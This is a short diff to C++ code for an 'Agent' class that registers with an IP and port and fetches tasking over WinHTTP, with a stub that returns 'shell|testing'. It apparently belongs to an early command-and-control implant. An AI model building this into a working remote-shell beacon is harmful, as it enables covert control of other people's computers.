@@ -16,9 +16,14 @@ void Agent::Register(std::string ip, unsigned int port) {
 
 
 std::string Agent::Get(std::wstring path) {
+	// path = path + "/" + AgentID + "/"
 	std::string result = "";
+
 	HINTERNET hSession, hConnect, hRequest;
-	
+	BOOL bResults = FALSE;
+	DWORD sSize = 0;
+
+
 	hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	
 	if (!hSession) {
@@ -37,7 +42,8 @@ std::string Agent::Get(std::wstring path) {
 		return "";
 	}
 
-	// path = path + "/" + AgentID + "/"
+	bResults = WinHttpSendRequest(hRequest,	WINHTTP_NO_ADDITIONAL_HEADERS,	0, WINHTTP_NO_REQUEST_DATA, 0,	0, 0);
+
 	return "shell|testing";
 }
 
